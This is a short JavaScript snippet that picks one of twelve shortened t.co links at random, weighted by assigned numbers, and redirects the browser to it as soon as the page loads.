// List of URLs with their respective weights
const urlWeights = [
    { url: "https://t.co/iCGhRXO6fU", weight: 50 },
    { url: "https://t.co/uVMVxjhiZX", weight: 10 },
    { url: "https://t.co/QWgbefZean", weight: 10 },
    { url: "https://t.co/AmVguTMBSq", weight: 10 },
    { url: "https://t.co/waNUMqvTfl", weight: 10 },
    { url: "https://t.co/dJ056vFgVv", weight: 10 },
    { url: "https://t.co/5IfJncj3uQ", weight: 100 },
    { url: "https://t.co/C8gqQGHozW", weight: 30 },
    { url: "https://t.co/EHb54L9Rrp", weight: 20 },
    { url: "https://t.co/Npme9DJsBw", weight: 20 },
    { url: "https://t.co/xqyWcCzwBG", weight: 20 },
    { url: "https://t.co/MyLLqPwi9o", weight: 10 },
   
];

// Function to get a random URL based on weights
function getWeightedRandomUrl() {
    // Calculate the total weight
    const totalWeight = urlWeights.reduce((sum, item) => sum + item.weight, 0);

    // Get a random number between 0 and totalWeight
    let randomNum = Math.random() * totalWeight;

    // Select the URL based on the random number
    for (const item of urlWeights) {
        if (randomNum < item.weight) {
            return item.url;
        }
        randomNum -= item.weight;
    }
}

// Redirect to the weighted random URL
window.location.href = getWeightedRandomUrl();
